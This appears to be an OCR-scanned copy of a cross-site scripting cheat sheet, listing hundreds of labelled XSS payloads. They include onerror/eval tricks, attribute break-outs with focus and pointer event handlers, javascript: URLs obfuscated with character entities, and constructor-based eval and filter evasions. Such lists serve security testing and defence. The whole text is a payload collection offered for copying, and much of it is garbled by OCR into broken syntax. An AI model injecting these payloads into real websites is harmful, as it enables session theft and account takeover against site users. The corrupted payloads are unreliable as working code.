&lt; new name&lt;/scrlpt&gt;

Copy Link

onerror and Error object on Firefox and Safari

&lt; script&gt;throw onerror=eval, x=new Error, x. message='

Copy Link

onerror and Error object on Chrome

&lt; script&gt;throw onerror=eval, x—new Error, x. name—t , x. message—

Copy Link

---

Redefining onerror and concealing the payload in attributes &lt; img src [ 1 ) . value—alt+id alt=ale id—rt&amp;lpar;l&amp;rpar;&gt; Copy Link

Attributes and SVG with payload concealed in window name &lt; script&gt;window. name— ' alert (1) onload "attributes C] . value name, new onload" > Copy Link

Attributes and SVG and onload event with payload concealed in URL and template strings < svg IO] . value—id+URL+id, new onload" Copy Link

Attributes and input with onfocus event with payload concealed in URL and template strings &lt; input C 0] . value=id+URL+1d, new on focus" id=s autofocus &gt; copy Link

Attributes and input with onclick event with payload concealed in URL and template strings requires two clicks < input onclick=attributes [O] . value ' 4URL+ copy Link

Form action and input with payload concealed in window name &lt; onclick=" torn-Act ion—top. name, type= submit , new submit" &gt; Copy Link

SVG and innerHTML to decode the URL then assign it with textContent payload concealed in URL < svg onload—inner HTML—URL, Copy Link

img and innerHTML to decode the URL then assign it with textContent payload concealed in URL < img/ src /

---

Link

innerHTML to decode the URL then eval it using textContent payload concealed in URL &lt; svg eval (textContent) &gt; Copy Link

innerHTML and outerHTML to avoid use of greater than < svg onload—outer HTML—id (1) &gt; Copy Link

U+2028 separator (js_comment) alert (1) Copy Link

0+2029 separator (js_comment) alert (1) Copy Link

prompt() (js_string_single) —prompt (1) — Copy Link

confirm() (js_string_single) —confirm (1) — Copy Link

window0 access (js_string_single) -window ['a '+' lerL'] (1)- Copy Link

---

I—window [ 'a '+' lert'] (1) — Copy Link

Unicode escape (js_string_single) -\u00611ert Copy Link

ES6 unicode escape (js_string_single)

Copy Link

ES6 unicode escape no zeros (js_string_single)

Copy Link

ES6 unicode escape padded zeros (js_string_single)

Copy Link

self[] access (js_string_single)

Copy Link

template-literal •a' string + self[] access (js_string_single) -self [S $ {'aS}1ertSl (1)- Copy Link

---

Copy Link

\x61 escape + self[] access (js_string_single)

Copy Link

1141 octal escape + selfO access (js_string_single)

Copy Link

Ia/.source + self[] access (js_string_single)

-self[/a/ . source+/lert/ . source] (1) —

Copy Link

atob.name[O] + self[] access (js_string_single)

—self [a tob . name [O] + ' Lert (1) — Copy Link

atob.name[O] + self[] access (js_string_single) #2 —self [atob.name [0] + ' Lert'] (1) —

Copy Link

String.fromCharCode(Ox61) + self[] access

—self [String. fromCharCode (0x61)+' Lert t] (1) — Copy Link

String.fromCodePoint(Ox61) + self[] access (js_string_single) -self [String. framCodePaint (0x61)+' 1 ert (1) Copy

---

10..toString(17) + self[] access (js_string_single) -self [10. (1)- Copy Link

IOn.toString(17) + selfO access -self lert'] (1)- Copy Link

Oxa.toString(17) + self[] access '—self Copy Link

Ob1010.toString(17) + selfd access (js string single) —self [Ob1010.toString (17)+' Lert' (1) — Copy Link

0012.toString(17) + selfO access -self [0012. Copy Link

atob('YQ==') + self[] access -self [a tob ( ) + ' lert (1) — Copy Link

+ self[] access (js_string_single) -self [unescape (1)- Copy Link

+ self[] access (js_string_single) ' —self [decodeURI Lert'] (1) —

---

Link

decodeURlComponent('%61') + selfO access (js_string_single) —self [decodeURIComponent ( ' ) + ' Lert (1) — Copy Link

+1] coercion + self[] access (js_string_single)

Copy Link

frames[] access (js_string_single) '—frames ['a '+' lert'] (1) Copy Link

globalThis[] access (js_string_single) -global This ['a'+'lert'] (1)- Copy Link

topo access (js_string_single) —top ['a'+'lert'] (1) — Copy Link

parent[] access (js_string_single) —parent ['a '+' (1) — Copy Link

this[] access (js_string_single) '-this ['a '+' lert'] (1) — Copy Link

---

—alert '1 Copy Link

; separator + throw onerror=alert (js_string_single) ' ; throw onerror=alert, 1; ' Copy Link

LF separator + throw onerror=alert throw onerror=alert, 1 Copy Link

U+2028 separator + throw onerror=alert (js_string_single) throw Copy Link

U+2029 separator + throw onerror=alert throw Copy Link

location—name - [location—namel - Copy Link

location.href=name (js_string_single) - [location . href=name) Copy Link

---

' — [Iocatian java script: alert Copy Link

location=javascript: \xNN paren (js_string_single)

— [location—' java script : Copy Link

location=javascript: paren + \u0028 escape (js_string_single) - [location=' javascript : alert\u00281 \u0029'

Copy Link

location=javascript: octal paren

- [location—'

Copy Link

Symbol.haslnstance+eval (js_string_single) — [ alert\x281 \ x 29 instanceof{ L Symbol . has Instance]

Copy Link

alternative JS syntax (event_handler_js_string_single) —alert (1)

Copy Link

&apos; entity quote (event_handler_js_string_single)

&apos; —alert (1) —&apos; Copy Link

&#x27; entity quote (with ;)

Copy

---

&#39; entity quote (with ;) (event_handler_js_string_single) -alert (1) Copy Link

&#x27 entity quote (no ;) alert Copy Link

&#39 entity quote (no ;)

Copy Link

javascript: URL (attribute href) java Script : alert (1) Copy Link

javascript: URL via raw newline (inline) (attribute_href) java script: alert (1) Copy Link

javascript: URL via raw tab (inline) (attribute_href) java script: alert (1) Copy Link

javascript: URL via &colon; entity (attribute_href) javascript&colon; alert (1) Copy Link

javascript: URL via &#58; entity (inline, with ;) (attribute_href) java script alert (1)

---

Link

javascript: URL via &#58 entity in JS + &#58; entity (inline, no ;) (attribute_href) java (1) Copy Link

javascript: URL via &#x3a; entity (inline, with ;) (attribute_href) alert (1) Copy Link

javascript: URL via &#x3a; entity (inline, no ;) (attribute_href) java script&#x3a—a1ert (1) Copy Link

javascript: URL via &NewLine; entity (inline) (attribute_href) java &NewZine; script : alert (1) Copy Link

javascript: URL via &Tab; entity (inline) (attribute_href) java & Tab; script: alert (L) Copy Link

javascript: URL via &#x9; entity (inline, with ;) (attribute_href) script: alert (L) Copy Link

javascript: URL via entity (inline, with ;) (attribute_href)

Copy Link

---

java script: alert (1) Copy Link

javascript: URL via entity (inline, with ;) (attribute_href) java '#00000000000009; script : alert (1) Copy Link

javascript: URL via &#x9; entity (inline, no ;) (attribute_href) java (1) Copy Link

javascript: URL via entity (inline, no ;) (attribute_href) java : alert (1) Copy Link

javascript: URL via &#9; entity (inline, no ;) (attribute_href) java&#9script:a1ert (1) Copy Link

javascript: URL via entity (inline, no ;) (attribute_href) java : alert (1) Copy Link

javascript: URL via &NewLine; entity (prefix) (attribute_href) &NewLine; javascript : alert (1) Copy Link

---

&Tab; java script: alert (1) Copy Link

javascript: URL via raw newline (prefix) (attribute_href) javascript : alert (1) Copy Link

javascript: URL via %09 tab prefix (attribute_href) %09javascript : alert (1) Copy Link

javascript: URL via space prefix (attribute_href) % 20 javascript:alert (1) Copy Link

javascript: URL via &#1; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#2; entity (prefix, with ;) (attribute_href) javascript:alert (1) Copy Link

javascript: URL via &#3; entity (prefix, with ;) (attribute_href) #3; java script: alert (1) Copy Link

javascript: URL via &#4; entity (prefix, with ;) (attribute_href)

Copy

---

javascript: URL via &#5; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#6; entity (prefix, with ;) (attribute_href) &#6;javascript:a1ert (1) Copy Link

javascript: URL via &#7; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#8; entity (prefix, with ;) (attribute href) j avascript : alert (1) Copy Link

javascript: URL via &#9; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#IO; entity (prefix, with ;) (attribute_href) &#10;javascript:a1ert (1) Copy Link

javascript: URL via &#11; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#12; entity (prefix, with ;) (attribute_href)

---

Link

javascript: URL via &#13; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#14; entity (prefix, with ;) (attribute_href) '#14; java script: alert (1) Copy Link

javascript: URL via &#15; entity (prefix, with ;) (attribute_href) '#15; java script: alert (1) Copy Link

javascript: URL via &#16; entity (prefix, with ;) (attribute_href) & #16; java script: alert (1) Copy Link

javascript: URL via &#17; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#18; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#19; entity (prefix, with ;) (attribute_href)

Copy Link

---

Copy Link

javascript: URL via &#21; entity (prefix, with ;) (attribute_href) '#21; javascript:alert (1) Copy Link

javascript: URL via &#22; entity (prefix, with ;) (attribute_href) '#22; java script: alert (1) Copy Link

javascript: URL via &#23; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#24; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#25; entity (prefix, with ;) (attribute_href) &#25;javascript:a1ert (1) Copy Link

javascript: URL via &#26; entity (prefix, with ;) (attribute_href) &#26;javascript:a1ert (1) Copy Link

---

& #27; java script: alert (1) Copy Link

javascript: URL via &#28; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#29; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#30; entity (prefix, with ;) (attribute_href) '#30; javascript:alert (1) Copy Link

javascript: URL via &#31; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#xl; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x2; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x3; entity (prefix, with ;) (attribute_href)

Copy

---

javascript: URL via &#x4; entity (prefix, with ;) (attribute_href) &#x4;javascript:a1ert (1) Copy Link

javascript: URL via &#x5; entity (prefix, with ;) (attribute_href) &#x5;javascript:a1ert (1) Copy Link

javascript: URL via &#x6; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x7; entity (prefix, with ;) (attribute href)

Copy Link

javascript: URL via &#x8; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x9; entity (prefix, with ;) (attribute_href) &#x9;javascript:a1ert (1) Copy Link

javascript: URL via &#xa; entity (prefix, with ;) (attribute_href) javascript:alert (1) Copy Link

javascript: URL via &#xb; entity (prefix, with ;) (attribute_href) java script: alert (1)

---

Link

javascript: URL via &#xc; entity (prefix, with ;) (attribute_href) java script: alert (1) Copy Link

javascript: URL via &#xd; entity (prefix, with ;) (attribute_href) java script: alert (1) Copy Link

javascript: URL via &#xe; entity (prefix, with ;) (attribute_href) java script: alert (1) Copy Link

javascript: URL via &#xf; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x10; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via ; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x12; entity (prefix, with ;) (attribute_href)

Copy Link

---

Copy Link

javascript: URL via &#x14; entity (prefix, with ;) (attribute_href) &#x14;javascript:a1ert (1) Copy Link

javascript: URL via &#x15; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x16; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x17; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#x18; entity (prefix, with ;) (attribute_href) &#x18;javascript:a1ert (1) Copy Link

javascript: URL via &#x19; entity (prefix, with ;) (attribute_href)

Copy Link

---

Copy Link

javascript: URL via &#xlb; entity (prefix, with ;) (attribute_href) java script: alert (1) Copy Link

javascript: URL via &#xlc; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#xld; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#xle; entity (prefix, with ;) (attribute_href)

Copy Link

javascript: URL via &#xlf; entity (prefix, with ;) (attribute_href)

Copy Link

atob.constructor() (js_string_single) —atob.constructor('a'+tlert (1) Copy Link

btob.constructor() (js_string_single) ' -btob . constructor ('a '+' 1 ert (1) Copy

---

Ink.constructor() (js_string_single) -Ink. constructor('a'+'lert (1) Copy Link

HID.constructor() -HID. constructor ('a '+' 1 ert (1) Copy Link

GPU.constructor() (js_string_single) —G?U . constructor ( 'a ' +11 ert (1) Copy Link

when.constructor() (js string single) —when . constructor +1 | ert (1) Copy Link

find.constructor() (js_string_single) '—find. constructor('a'+'lert (1) t Copy Link

print.constructor() -print. constructor ('a '+' 1 ert (1) ' Copy Link

Set.constructor() (js_string_single) -Set. constructor ('a '+' 1 ert (1) Copy Link

Object constructor.constructor() (js_string_single) . constructor. constructor ('at-Fl Lert (1) ') ()—'

---

Link

String constructor.constructor() (js_string_single)

. constructor. constructor ( 'at + ' 1 ert (1) Copy Link

Array constructor.constructor() (js_string_single) — [ ] . constructor . constructor ('at + ' Lert (1) ( ) —

Copy Link

Number constructor.constructor() (js_string_single)

. constructor. constructor ('a '+' Lert (1) ( ) — Copy Link

Bigint constructor.constructor() (js_string_single)

-On. constructor. constructor ('a '+' lert (1) ') ( ) Copy Link

createElement('script')+append (js_string_single) — [s=document . createELement ( script ) , s . append ( + ' Lert (1) , document . document Element . append (s) I —

Copy Link

location.replace(javascript:) (js_string_single)

—location. replace ('java (1) Copy Link

(js_string_single)

Copy Link

---

/ on focus—alert (1) tabindex=l autofocus/

Copy Link

attribute break-out with onfocusin (slash-sep) +tabindex *autofocus (attribute_double)

" /onfocusin=alert (1) tabindex=l autofocus/

Copy Link

attribute break-out with onmousemove (slash-sep) (attribute_double)

" /onmousemove=alert (1) style—position: fixed; z —index: 100000; left: O; /

Copy Link

attribute break-out with onmouseenter (slash-sep) (attribute_double)

" /onmouseenter—alert (1) style—positron: fixed; width: IO index: 100000; left: O; top: O /

Copy Link

attribute break-out with onpointerenter (slash-sep) (attribute_double)

/onpointerenter—alert (1) style—position: fixed; index: 100000; left : 0; top:O /

Copy Link

attribute break-out with onpointermove (slash-sep) (attribute_double)

" /onpointermove=alert (1) style—position: fixed; index: 100000; left: O; top: 0 /

Copy Link

attribute break-out with onpointerover (slash-sep) (attribute _ double)

" /onpointerover=alert (1) style—position: fixed; index: 100000; left: O; top: 0 /

Copy Link

---

" /onpointerrawupdate=alert (1) z —index: 100000; /

Copy Link

attribute break-out with onmousedown (slash•sep) (attribute_double) 't /onmousedown=alert (1) style—position: fixed; index: 100000; left: O; /

Copy Link

attribute break-out with onmouseup (slash•sep) (attribute_double) " /onmouseup=alert (1) style=position:fixed;w1dth:1C0vw;height:1C0vh;z index: 100000; left: 0; top: 0 /

Copy Link

attribute break-out with onpointerdown (slash-sep) (attribute_double)

" /onpointerdown=alert (1) styLe=position:fixed;width:1C0vw;height:100vh;z index: 100000; left: O; top: 0 /

Copy Link

attribute break-out with onpointerdown (slash-sep) (attribute_double) #2 " /onpointerdown—alert (1) style—position: fixed; index: 100000; left: O; top: O /

Copy Link

attribute break-out with onfocus (slash-sep) *autofocus (attribute_double) / on focus—alert (1) autofocus/

Copy Link

attribute break-out with onfocusin (slash-sep) +autofocus (attribute_double)

/ on focus in—alert (1) autofocus/

Copy Link

attribute break-out with onmousemove (slash•sep) (attribute_double) #2 " /onmousemove—alert (1) style—position: fixed; index: 100000; /

Copy

---

attribute break-out with onmouseenter (slash-sep) (attribute_double) #2 " /onmouseenter=alert (1) style—posit 1 on: fixed; Index: 100000; left: 0; top: 0 /

Copy Link

attribute break-out with onpointerenter (slash-sep) (attribute_double) #2 " /onpointerenter—alert (1) index: 100000; left: 0; top: O / Copy Link

attribute break-out with onpointermove (slash-sep) (attribute_double) #2 " /onpointermove=alert (1) styLe=position: fixed; width: z —index: 100000; left: O; top: O /

Copy Link

attribute break-out with onpointerover (slash-sep) (attribute double) #2 " /onpointerover=alert (1) style=position: fixed; width: z —index: 100000; left: O; top: O / Copy Link

attribute break-out with onpointerrawupdate (slash.sep) (attribute_double) #2 " /onpointerrawupdate=alert (1) style—position: fixed; : IOOvh;z index: 100000; left: 0; top: O / Copy Link

attribute break-out with onmousedown (slash.sep) (attribute_double) #2 " /onmousedown—alert (1) style=position:fixed;width:1C0vw;height:1C0vh;z index: 100000; left: 0; top: 0 /

Copy Link

attribute break-out with onmouseup (slash-sep) (attribute_double) #2 " /onmouseup—alert (1) style—position: index: 100000; left:0;top:0 /

Copy Link

attribute break-out with onpointerdown (slash-sep) (attribute_double) #3 't /onpointerdown=alert (1) style=position: fixed; width: z —index: left: O; top: O /

---

Link

attribute break-out with onpointerdown (slash-sep) (attribute_double) #4 'T /onpointerdown=alert (1) style—position: fixed; index: 100000; left: O; / Copy Link

attribute break-out with onfocus (unquoted) *autofocus (attribute_unquoted) 1 on focus—alert (1) autofocus/ Copy Link

attribute break-out with onfocusin (unquoted) *autofocus (attribute_unquoted) 1 on focus in—alert (1) autofocus/ Copy Link

attribute break-out with onmousemove (unquoted) (attribute_unquoted) 1 onmousemove=alert (1) style—position: fixed; width: index: 100000; left: O; top: O / Copy Link

attribute break-out with onmouseenter (unquoted) (attribute_unquoted) 1 onmouseenter=alert (L) style=position: fixed; width: index: 100000; left: O; top:O / Copy Link

attribute break-out with onpointerenter (unquoted) (attribute_unquoted) 1 onpointerenter=alert (1) style—position: fixed; width: index: 100000; Left : O; top: O / Copy Link

attribute break-out with onpointermove (unquoted) (attribute_unquoted) 1 onpointermove•a1erL (1) s Lyle—position: index: 100000; / Copy Link

---

1 onpointerover=alert (1) style—position: fixed; width: z —index: 100000; Left: O; top: O /

Copy Link

attribute break-out with onpointerrawupdate (unquoted) (attribute _ unquoted)

1 onpointerrawupdate=alert (1) index: 100000; left: 0; top: 0 /

Copy Link

attribute break-out with onpointerrawupdate (unquoted) (attribute _ unquoted) #2 1 onpointerrawupdate=alert (1) style—position: fixed; : 100 v h; z —index: /

Copy Link

attribute break-out with onmouseup (unquoted) (attribute_unquoted) 1 onmouseup—alert (1) style—position: fixed; w index: 100000; left: O; top: O /

Copy Link

attribute break-out with onpointerdown (unquoted) (attribute_unquoted)

1 onpointerdown—alert (1) style—position: fixed; width: index: 100000; left: 0; top: 0 /

Copy Link

attribute break-out with onfocus (quoted-handler) +autofocus (attribute_double) (1) " / autofocus/

Copy Link

attribute break-out with onfocusin (quoted-handler) *autofocus (attribute _ double)

"on focusin=" alert (1) " / autofocus/

Copy Link

---

"onmousemave ' 'alert (1) "style "position: fixed; z —index: 100000; left: O; top: O"

Copy Link

attribute break-out with onmouseenter (quoted-handler) (attribute_double)

(1) " fixed; width: index: 100000; left: O; top: O"

Copy Link

attribute break-out with onpointerenter (quoted-handler) (attribute_double)

"onpointerenter="alert (1) z —index: 100000; left: 0; top: 0" /

Copy Link

attribute break-out with onpointermove (quoted-handler) (attribute_double)

"onpointermove="alert (1) "styLe="pos1tion:f1xed;width:1CCvw;height:100vh;z index: 100000; left: 0; top: O" /

Copy Link

attribute break-out with onpointerover (quoted-handler) (attribute_double)

(1) ' 'style "position: fixed; width: index: 100000; left : O; top: O"

Copy Link

attribute break-out with onpointerrawupdate (quoted-handler) (attribute_double)

(1) "style—'tpositlon: fixed; Index: 100000; left: 0; top /

Copy Link

attribute break-out with onmouseup (quoted-handler) (attribute_double)

(1) "style—liposition: fixed; index: 100000; left: 0; top: 0" /

Copy Link

attribute break-out with onpointerdown (quoted-handler) (attribute_double)

(1) fixed; width: index: 100000; left: 0; top: O"

Copy

---

javascript: URL (iframe_src)

tabindex=l autofocus onfocusln—alert (1)

Copy Link

with onfocus using atob.constructor() (html)

```text
<xss tabindex=l autofocus onfocus=atob. constructor ('a '+' -Lert (1) ') ( ) >
```

Copy

Link

with onfocus using btob.constructor() (html)

```text
<xss tabindex=l autofocus onfocus=btob. constructor ( 'a '+' 1 ert (1)
```

Copy Link

with onfocus using Ink.constructor() (html)

```text
<xss tabindex=l autofocus on focus—I n k. 1 ert (1)
```

Copy

Link

with onfocus using HID.constructor() (html)

< x ss tabindex=l autofocus onfocus=HID. constructor ( ' a '+' I ert (1)

Copy

Link

with onfocus using GPU.constructor() (html)

< xss tabindex—l autofocus onfocus=GPU . constructor ('a '+' 1 ert (1) '

Copy Link

with onfocus using when.constructor() (html)

&lt; xss tabindex—l autofocus onfocus=when. constructor ('a '+' lert (1) ') ( ) &gt;

Copy

Link

with onfocus using find-constructor() (html)

```text
<xss tabindex=l autofocus on focus—find. constructor ( ' at + ' 1 ert (1)
```

---

Link

with onfocus using print.constructor() (html)

```text
<xss tabindex=l autofocus on focus—print. constructor ( Tert (1)
```

Copy Link

with onfocus using Set.constructor() (html) < x ss tabindex—l autofocus on focus—Set . constructor ( ' a '+' I ert

Copy Link

with onfocus using Object constructor.constructor() (html)

&lt; x ss tabindex—l autofocus on . constructor . constructor ('a '+' 1 ert (1) ' ) ( ) &gt;

Copy Link

with onfocus using String constructor.constructor() (html)

```text
<xss tabindex=l autofocus on focus
```

. constructor . constructor + ' (1) ' ) ( ) > Copy Link

with onfocus using Array constructor.constructor() (html)

```text
<xss tabindex=l autofocus on focus—a . constructor Lert (1)
```

Copy Link

with onfocus using Number constructor.constructor() (html)

```text
<xss tabindex=l autofocus on focus—O.. constructor . constructor ( 'a' +1 | ert (1)
```

Copy Link

with onfocus using Bigint constructor-constructor() (html)

```text
<xss Labindex—l auLofocus on focus—On.consLructor. constructor ('a '+' lerc (1) ') ( ) >
```

Copy Link

---

```text
<xss tabindex=l autofocus on ( script') , s. append( 'a' + ' Lert (1) ' ) , this . append (s) >
```

Copy Link

with onfocus using location.replace(javascript:) (html)

```text
<xss tabindex=l autofocus onfocus=location.replace (1) ' ) >
```

Copy Link

with onfocus using (html)

```text
<xss tab index—I autofocus on (1) ' >
```

Copy Link

with onfocus using location=self.name (html)

```text
<xss tab index—I autofocus on . name>
```

Copy Link

with onfocus using location—frames.name (html)

&lt; x ss tabindex—l autofocus on focus—location—frames . name&gt; Copy Link

with onfocus using location—globalThis.name (html)

```text
<xss tabindex=l autofocus . name>
```

Copy Link

with onfocus using location=gIobalThis.name (html) #2

```text
<xss tabindex=l autofocus . name>
```

Copy Link

---

```text
<xss tab index—I autofocus onfocus throw/ ** / self . onerror
```

Copy Link

with onerror+onfocus using throw frames.onerror=alert + 1**1 comment as space + &#97 entity in JS (html)

```text
<xss tab index—I autofocus on focus—throw/ ** / frames .
```

Copy Link

with onerror+onfocus using throw globalThis.onerror=alert + comment as space + &#97 entity in JS (html)

```text
<xss tabindex=l autofocus / global This.
```

Copy Link

with onerror+onfocus using throw self.onerror=alert + &#97 entity in JS + quoted handler value (html)

```text
<xss tabindex—l autofocus on focus—"throw self . 1" >
```

Copy Link

with onerror+onfocus using throw frames.onerror=alert + &#97 entity in JS + quoted handler value (html)

```text
<xss tabindex=l autofocus on focus "throw frames . onerror
```

Copy Link

with onerror+onfocus using throw globalThis.onerror=alert + &#97 entity in JS + quoted handler value (html)

```text
<xss tabindex=l autofocus on focus—I' throw global This . | '1 >
```

Copy Link

with onerror+onfocus using throw defaultView.onerror=aIert + &#97 entity in JS + quoted handler value (html)

```text
<xss tabindex—l autofocus on focus—nthrow default View. 1 1' >
```

Copy Link

with onerror+onfocus using throw defaultView.onerror=aIert + defaultView[] access + quoted handler value (html)

< xss title—aler id=t tabindex—l autofocus on default View.

Copy

---

with onerror+onfocus using throw defaultView.onerror=aIert + &Tab; as space + defaultView0 access (html)

```text
<xss title—aler id=t tabindex—l autofocus on [title+id] ,
```

Copy Link

with onerror+onfocus using throw defaultView.onerror=aIert + &#32 as space + defaultView[l access (html)

```text
<xss title—aler id=t tabindex—l autofocus on .
```

Copy Link

with onerror+onfocus using throw self.onerror=alert + &#32 as space + self[] access (html)

```text
<xss title=aler id=t tabindex=l autofocus on . onerror—self C title+id) ,
```

Copy Link

with onerror+onfocus using throw globalThis.onerror=alert + &#32 as space + globalThis[l access (html)

```text
<xss title—aler id=t tabindex=l autofocus on onerror—g oba1This [title+id)
```

Copy Link

with onerror+onfocus using throw frames.onerror=alert + &#32 as space + frames[] access (html)

< x ss title=aler id=t tabindex=l autofocus . onerror=frames [title+ld] Copy Link

with onfocus using location=title+id (&lpar; parens) (html) &lt; xss title—java id—script : ale class=rt&amp;lpar;l&amp;rpar; tabindex=l autofocus on focus—location=tit1e+id+c1assName&gt;

Copy Link

```text
<xss> with onfocus using location—title+id (&#40 parens) (html)
```

&lt; xss title—java id—script : ale class=rt&amp;#40;1&amp;#41; tabindex=l autofocus onfocus—10cation—tit1e+id+c1assName&gt;

Copy Link

with onfocus using location=title+id (&#x28 parens) (html)

```text
<xss title—java id=script : ale tabindex=l autofocus on
```

---

Link

with onfocus using window[] access (html)

```text
<xss tabindex=l autofocus on focus—window
```

'a'+'1ert'J (1) > Copy Link

with onfocus using template-literal •a' string + window[] access (html) &lt; x ss tabindex—l autofocus on focus—window [ lert'] (1) &gt; Copy Link

with onfocus using unicode escape (html) &lt; x ss tabindex—l autofocus on (1) &gt; Copy Link

with onfocus using ES6 unicode escape (html)

```text
<xss tabindex—l autofocus on focus—Xu {0061} lert (1) >
```

Copy Link

with onfocus using ES6 unicode escape without zero padding (html)

```text
<xss tabindex=l autofocus on (1) >
```

Copy Link

with onfocus using ES6 unicode escape with zero padding (html)

```text
<xss tabindex—l autofocus on (1) >
```

Copy Link

with onfocus using self[] access (html)

```text
<xss Labindex—l auLofocus on focus—self ['a '+' lerC'1 (1) >
```

Copy Link

---

```text
<xss tabindex=l autofocus on ) 1 ere J (1) >
```

Copy Link

with onfocus using literal in string + self[] access (html)

```text
<xss tabindex=l autofocus (1) >
```

Copy Link

with onfocus using b(61 escape + self[l access (html)

```text
<xss tab index—I autofocus on '+' Tert') (1) >
```

Copy Link

with onfocus using 1141 octal escape + self[] access (html)

```text
<xss tab index—I autofocus on focus—self L '\141 '+' Tert') (1) >
```

Copy Link

with onfocus using lal.source + self[] access (html)

&lt; x ss tabindex—l autofocus on focus—self [ / a/ . source+/lert/ . source] (1) &gt;

Copy Link

with onfocus using atob.name[O] + self[] access (html)

```text
<xss tabindex=l autofocus . name [Cl+'lert') (1) >
```

Copy Link

with onfocus using atob.name[O] + selfO access (html) #2

```text
<xss tabindex=l autofocus onfocus=self [atob . name [Cl+'lert') (1) >
```

Copy Link

---

```text
<xss tab index—I autofocus on focus self [String. fromCharCode (Ox 61) + ' 1 ert') (1) >
```

Copy Link

with onfocus using String.fromCodePoint(Ox61) + self[] access (html)

```text
<xss tab index—I autofocus on focus—self (String. fromCodePoint (Cx61) + ' lert'] (1) >
```

Copy Link

with onfocus using IO..toString(17) + self0 access (html)

```text
<xss tabindex=l autofocus onfocus=self [1 C. .toString (17)+' Lert'] (1) >
```

Copy Link

with onfocus using IOn.toString(17) + selfO access (html)

```text
<xss tabindex—l autofocus on focus—self [ICn.toString (17)+' Lert'] (1) >
```

Copy Link

with onfocus using Oxa.toString(17) + selfO access (html)

```text
<xss tab index—I autofocus on focus self [Oxa.toString (17)+' Lert'] (1) >
```

Copy Link

with onfocus using Ob1010.toString(17) + self[] access (html)

```text
<xss tabindex=l autofocus on focus—self [OblCIC.toString (17) + ' lert'] (1) >
```

Copy Link

with onfocus using 0012.toString(17) + self[] access (html)

```text
<xss tabindex—l autofocus on focus—self [0012. toStr1ng (17)+' Lert'] (1) >
```

Copy Link

with onfocus using atob('YQ==') + self[] access (html)

&lt; xss tabindex—l autofocus on focus—self [a tob (I) &gt;

Copy

---

with onfocus using unescape('%61') + self[] access (html)

```text
<xss tabindex—l autofocus onfocus=self [unescape ( '2661 ' ) + ' -Lert'] (1) >
```

Copy Link

with onfocus using + self[] access (html)

```text
<xss tabindex—l autofocus ('%61 ')+' Lert'] (1) >
```

Copy Link

with onfocus using decodeURIComponentC%61') + self[] access (html)

```text
<xss tabindex—l autofocus onfocus—self (decodeURIComponent ( ' % 61 ) + ' 1 ert ' ] (1) >
```

Copy Link

with onfocus using +0 coercion + self[l access (html)

```text
<xss tabindex=l autofocus on focus—self +C]+' lert') (1) >
```

Copy Link

with onfocus using frames[] access (html) &lt; x ss tabindex=l autofocus (1) &gt; Copy Link

with onfocus using IOn.toString(17) + defaultView[] access (html) &lt; xss tabindex—l autofocus onfocus=defau1tV1ew lert'] (1) &gt; Copy Link

```text
<xss> with onfocus using Oxa.toString(17) + defaultViewO access (html)
```

&lt; xss tabindex—l autofocus lert'] (1) &gt; Copy Link

with onfocus using Ob1010.toString(17) + defaultView[] access (html)

```text
<xss tabindex=l autofocus on focus—defaultV1ew .toString (17)+' ] (1) >
```

---

Link

with onfocus using 0012.toString(17) + defaultView[] access (html)

```text
<xss tabindex=l autofocus on focus—default View (()012 . toString (17)+' Lert'] (1) >
```

Copy Link

with onfocus using atob('YQ==') + defaultViewO access (html) < x ss tabindex—l autofocus on focus—default View Catob ( YQ—

Copy Link

with onfocus using unescape('%61') + defaultView[] access (html)

&lt; x ss tabindex—l autofocus on focus—default View [unescape ( ' % 61 ) + ' _lert'] (1) &gt;

Copy Link

with onfocus using + defaultView[] access (html)

```text
<xss tab index—I autofocus on focus—default View [decodeURI ( % 61 ) + ' 1 erti] (1) >
```

Copy Link

with onfocus using + defaultView[] access (html)

```text
<xss tabindex=l autofocus onfocus=defau1tView (decodeURIComponent ( % 61 ) +1 Lert' ] (1) >
```

Copy Link

with onfocus using +0 coercion + defaultView[] access (html)

```text
<xss tabindex—l autofocus on Lert' J (1) >
```

Copy Link

with onfocus using defaultView[] access (html)

```text
<xss Labindex—l autofocus on focus—default View [ 'a '+' lert'] (1) >
```

Copy Link

---

ect . prototype . message— a Lert ; Array . prototype . toString—Error . prototype . toString; Error . pr Stack Trace Function; const x — new Copy Link

Frameworks

Bootstrap onanimationstart event

```text
<xss
```

onanimationstart—alert (1) >

Copy Link

Bootstrap ontransitionend event

&lt; x ss slide" data—ride—carousel on transitionend=alert (1) &gt;<xss

```text
<xss carousel—item
```

Copy Link

Protocols

'frame src attribute JavaScript protocol

< i frame (1)

Copy Link

A standard JavaScript protocol

```text
<a : a Lert (1)
```

Copy Link

The protocol is not case sensitive

```text
<a (1) ">XSS</a>
```

Copy Link

Characters \xOI -b(20 are allowed before the protocol

< a href=" java script : alert (1)

Copy Link

---

Characters are allowed inside the protocol

```text
<a href—"javas cript:alert (1)
```

Copy Link

Characters are allowed after protocol name before the colon < a : alert (1) Copy Link

Xlink namespace inside SVG with JavaScript protocol

```text
